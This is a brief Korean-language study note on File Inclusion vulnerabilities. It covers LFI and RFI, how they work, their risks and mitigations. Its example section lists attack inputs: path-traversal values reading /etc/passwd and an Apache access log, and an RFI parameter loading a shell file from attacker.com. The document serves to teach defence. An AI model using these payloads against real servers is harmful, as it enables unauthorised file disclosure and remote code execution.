# File Inclusion

## 개요

- File Inclusion은 웹 애플리케이션이 사용자 입력값을 검증 없이 파일 경로에 포함시킬 때 발생하는 취약점으로,  
공격자가 서버 내부 또는 외부 파일을 불러와 내용을 확인하거나 실행할 수 있는 공격 방식입니다.

---

## File Inclusion 종류

| 구분 | 설명 | 특징 |
|------|------|------|
| LFI (Local File Inclusion) | 서버 내부 파일 포함 | /etc/passwd 등 내부 파일 조회 |
| RFI (Remote File Inclusion) | 외부 파일 포함 | 원격 서버의 악성 코드 실행 가능 |

---

## 핵심 개념

- 사용자 입력값이 파일 경로에 직접 전달될 때 발생합니다.  
- 입력값 검증이 없거나 불충분할 경우 공격이 가능합니다.  
- 서버 내부 파일 접근 또는 코드 실행으로 이어질 수 있습니다.  

---

## 공격 방식 설명

공격자는 파일 경로 입력값에 디렉토리 이동 문자열(`../`) 또는 외부 URL을 삽입하여  
의도하지 않은 파일을 포함하도록 유도합니다.

---

## 예시

- 정상 입력  
  → page=home.php  

- 공격 입력  
  → page=../../../../etc/passwd  
  → page=../../../../var/log/apache2/access.log  
  → page=http://attacker.com/shell.txt  

- 웹 입력 예시  
  → URL 파라미터에 `?page=../../../../etc/passwd` 입력 시 시스템 파일 내용 출력  

---

## 특징

- 서버 내부 파일을 직접 조회할 수 있습니다.  
- 설정 파일, 계정 정보 등 민감 정보 유출로 이어질 수 있습니다.  
- RFI의 경우 원격 코드 실행까지 가능하여 위험도가 매우 높습니다.  
- 다른 공격(Log Poisoning, RCE 등)과 연계될 수 있습니다.  

---

## 대응 방안

- 사용자 입력값 검증 및 필터링 수행  
- 디렉토리 이동 문자열(`../`) 차단  
- 파일 경로 화이트리스트 적용  
- 외부 파일 포함 기능 비활성화 (`allow_url_include=Off`)  
- 최소 권한 원칙 적용  

---

## 정리

- File Inclusion은 파일 경로를 조작하여 서버 내부 파일을 읽거나 외부 코드를 실행하는 공격 방식입니다.
